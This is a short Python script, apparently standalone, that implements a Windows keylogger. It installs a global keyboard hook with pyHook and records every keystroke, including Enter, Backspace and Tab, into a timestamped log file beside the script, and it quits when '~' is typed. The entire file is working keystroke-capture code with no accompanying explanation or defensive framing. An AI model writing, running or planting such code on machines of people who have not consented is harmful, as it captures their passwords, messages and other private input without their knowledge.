import pyHook
import pythoncom
from datetime import *
import os

buffer = ""
pause_period = 2
last_press = datetime.now()
pause_delta = timedelta(seconds=pause_period)

root_dir = os.path.split(os.path.realpath(__file__))[0]
log_file = os.path.join(root_dir, "log_file.txt")

def log(message):
	if len(message) > 0:
		with open(log_file, "a") as f:
			write = "{}:\t{}\n".format(datetime.now(), message)
			f.write(write)
			print(write)

def keypress(event):
	global buffer, last_press

	if event.Ascii:
		char = chr(event.Ascii)

		if str(char) == "~":
			log(buffer)
			log("--PROGRAM ENDED--")
			quit()
		if event.Ascii==13:
			buffer += "<ENTER>\n"
			log(buffer)
			buffer = ""
		elif event.Ascii==8:
			buffer += "<BACKSPACE>"
		elif event.Ascii==9:
			buffer += "<TAB>"
		else:
			buffer += char

		return True



hm = pyHook.HookManager()
hm.KeyDown = keypress
hm.HookKeyboard()
pythoncom.PumpMessages()
